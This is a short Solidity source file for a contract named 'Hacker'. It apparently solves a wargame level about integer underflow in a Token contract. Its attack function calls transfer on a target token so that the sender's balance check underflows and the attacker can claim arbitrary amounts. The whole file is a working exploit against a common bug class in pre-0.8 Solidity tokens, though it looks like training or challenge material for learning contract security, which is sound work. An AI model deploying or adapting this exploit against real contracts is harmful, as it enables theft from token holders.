// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

import "./Token.sol";

contract Hacker {
  address public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() public {
    hacker = payable(msg.sender);
  }

  function attack(address _target, uint256 _amount) public onlyHacker {
    // This will make underflow in target contract, so we can pass the balance checking
    Token(_target).transfer(hacker, _amount);
  }
}
